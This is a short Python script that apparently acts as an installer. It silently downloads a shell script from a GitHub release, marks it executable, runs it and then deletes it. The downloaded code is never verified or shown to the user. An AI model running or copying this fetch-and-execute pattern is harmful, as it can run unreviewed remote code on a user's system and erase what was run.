import subprocess
import os

def main():
    os.system('clear')

    url = "https://github.com/oktaviaps/project/releases/download/install/install.sh"
    subprocess.run(['wget', '-O', 'setup.sh', '-q', url])

    subprocess.run(['chmod', '+x', 'setup.sh'])

    subprocess.run(['./setup.sh'])

    subprocess.run(['rm', '-fr', 'setup.sh'])

if __name__ == "__main__":
    main()
